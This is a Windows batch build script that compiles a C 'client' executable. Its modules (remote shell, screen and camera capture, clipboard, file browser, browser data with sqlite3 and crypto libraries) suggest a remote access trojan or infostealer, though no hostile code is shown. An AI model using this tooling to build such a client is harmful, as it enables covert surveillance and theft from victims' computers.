@echo off
set CC=gcc
set CFLAGS=-Iinclude -O3 -s -D_WIN32_WINNT=0x0601
set LIBS=-lws2_32 -lwinhttp -lbcrypt -lcrypt32 -lgdi32 -lole32 -lmf -lmfplat -lmfreadwrite -lmfuuid -luser32 -lpsapi -lshlwapi

echo Building C Client...
%CC% %CFLAGS% src/main.c src/utils.c src/sysinfo.c src/shell.c src/tasks.c src/clipboard.c src/filebrowser.c src/rfe.c src/screen.c src/camera.c src/browser.c src/cJSON.c src/miniz_common.c src/miniz_tdef.c src/miniz_tinfl.c src/miniz_zip.c src/sqlite3.c %LIBS% -o client_c.exe

if %ERRORLEVEL% EQU 0 (
    echo Build successful: client_c.exe
) else (
    echo Build failed.
)
